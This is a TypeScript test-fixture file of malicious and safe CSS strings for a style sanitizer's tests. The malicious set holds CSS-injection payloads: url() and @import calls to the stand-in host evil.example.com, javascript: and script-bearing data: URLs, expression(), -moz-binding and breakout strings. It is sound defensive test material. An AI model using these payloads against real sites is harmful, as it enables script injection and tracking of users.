/**
 * One payload per blocklist entry and per structural rule. They live here rather than inline so the
 * sanitizer tests, the validator tests and the playground's e2e attack the same strings, and so adding
 * a rule means adding a fixture that something must then neutralise.
 */
export const MALICIOUS_CSS = {
  urlRemote: 'url(https://evil.example.com/x.png)',
  urlSpaced: 'url ("https://evil.example.com/x.png")',
  urlJavascript: 'url(javascript:alert(1))',
  urlDataHtml: 'url("data:text/html,<script>alert(1)</script>")',
  /** An image type, and the one that can carry a script element — ADR-266 refuses it anyway. */
  urlDataSvg: 'url("data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=")',
  import: '@import url("https://evil.example.com/x.css")',
  expression: 'expression(alert(1))',
  behavior: 'behavior: url(x.htc)',
  mozBinding: '-moz-binding: url(x.xml)',
  element: 'element(#target)',
  comment: 'red /* url( */',
  escape: 'u\\rl(https://evil.example.com/x.png)',
  unbalancedParen: 'rgb(0, 0, 0',
  strayParen: 'rgb(0, 0, 0))',
  /** A grid track list, where the line names are the brackets. */
  unbalancedBracket: '[full-start 1fr',
  unterminatedString: 'url("data:image/png;base64,AAA',
  semicolon: 'red; position: fixed',
  brace: '} body { display: none',
  tooLong: `red ${'x'.repeat(9000)}`,
} as const

/** The declaration-list spellings, which is the shape a `css` escape-hatch prop actually holds. */
export const MALICIOUS_DECLARATIONS = {
  behavior: 'behavior: url(#default#time2)',
  mozBinding: '-moz-binding: url(https://evil.example.com/x.xml#xss)',
  import: '@import "https://evil.example.com/x.css"',
  remoteImage: 'background: url(https://evil.example.com/pixel.png)',
  expression: 'width: expression(alert(1))',
  element: 'background: element(#target)',
  comment: 'color: red /* url( */',
  escape: 'background: u\\rl(https://evil.example.com/x.png)',
  unbalanced: 'background: rgb(0, 0, 0',
  noColon: 'opacity 0.5',
  selector: 'a { color: red }',
  uppercase: 'Box-Shadow: none',
  tooLong: `color: red ${'x'.repeat(9000)}`,
} as const

export const SAFE_CSS = {
  colour: 'rgb(12 12 16 / 60%)',
  shadow: '0 1px 2px rgba(0,0,0,.4), inset 0 0 0 1px rgb(255 255 255 / 6%)',
  gradient: 'linear-gradient(180deg, #101014 0%, #1a1a22 100%)',
  clip: 'polygon(0 0, 100% 0, 100% 80%, 0 100%)',
  /** The single `url()` exception: an inline image the asset sanitizer vouches for — ADR-266. */
  dataImage: 'url("data:image/png;base64,iVBORw0KGgo=")',
  modern: 'oklch(62% 0.19 285)',
} as const

export const SAFE_DECLARATIONS = {
  one: 'letter-spacing: -0.01em',
  several: 'color: red;\nopacity: 0.5',
  custom: '--brandBlue: oklch(62% 0.19 285)',
} as const
